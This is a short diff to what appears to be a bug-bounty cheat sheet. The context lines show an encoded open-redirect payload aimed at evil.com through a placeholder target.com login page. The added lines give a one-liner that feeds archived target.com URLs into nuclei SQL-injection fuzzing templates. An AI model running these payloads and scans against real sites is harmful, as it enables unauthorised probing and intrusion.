@@ -18,3 +18,8 @@ Payload:
  How to Use:
 - Target Login Page: https://target.com/login
 - Payload Usage (Test for Open Redirect): https://target.com/public/..%2F%5Cevil.com%2F%3F%2F..%2F..
+
+## SQL Injection One-Liner
+```
+waybackurls target.com | grep '=' | sort -u | nuclei -t ../fuzzing-templates/sqli -dast
+```
